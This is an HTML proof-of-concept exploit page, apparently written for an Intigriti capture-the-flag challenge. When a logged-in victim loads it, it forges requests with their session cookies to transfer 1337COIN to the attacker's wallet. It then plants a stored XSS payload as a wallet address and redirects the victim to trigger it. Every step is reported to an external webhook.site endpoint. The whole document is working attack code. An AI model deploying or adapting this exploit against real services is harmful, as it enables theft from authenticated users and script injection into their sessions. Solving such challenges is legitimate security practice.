<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <div id="status">Initializing exploit...</div>

    <script>
        const BASE = 'https://challenge-0126.intigriti.io';
        const WEBHOOK = 'https://webhook.site/9bcbf2c0-2010-4890-ba51-ce334ba4b12b';
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
        const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';

        // Webhook tracking function
        function track(step, status, data = {}) {
            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
            console.log(`[Webhook] ${step}: ${status}`, data);
        }

        async function runExploit() {
            const statusDiv = document.getElementById('status');

            track('start', 'exploit_triggered_onload', { wallet: YOUR_WALLET });

            try {
                // Step 1: Send 1337COIN to your wallet
                statusDiv.textContent = 'Step 1: Sending 1337COIN...';
                track('step1', 'sending_coins', { toAddress: YOUR_WALLET, currency: '1337COIN', amount: 1337 });

                const txResponse = await fetch(`${BASE}/api/transaction`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337
                    })
                });

                if (txResponse.ok) {
                    const txResult = await txResponse.json();
                    statusDiv.textContent = 'âœ“ Coins sent!';
                    track('step1', 'coins_sent_success', { txHash: txResult.txHash });
                } else {
                    track('step1', 'coins_failed', { status: txResponse.status });
                }

                // Step 2: Inject XSS via wallet creation
                statusDiv.textContent = 'Step 2: Injecting XSS payload...';
                track('step2', 'injecting_xss', { payload: XSS_PAYLOAD });

                const walletResponse = await fetch(`${BASE}/api/wallets`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({
                        currency: '1337COIN',
                        address: XSS_PAYLOAD,
                        balance: 1337
                    })
                });

                track('step2', 'xss_injected', { status: walletResponse.status });

                // Step 3: Redirect to dashboard to trigger XSS
                statusDiv.textContent = 'Step 3: Triggering XSS...';
                track('step3', 'redirecting_to_dashboard', {});

                setTimeout(() => {
                    track('final', 'redirected', {});
                    window.location.href = `${BASE}/dashboard.html`;
                }, 500);

            } catch (error) {
                track('error', 'exception', { error: error.message });
                setTimeout(() => {
                    window.location.href = `${BASE}/dashboard.html`;
                }, 1000);
            }
        }

        // Auto-run on page load
        window.addEventListener('load', () => {
            setTimeout(runExploit, 100);
        });
    </script>
</body>
</html>

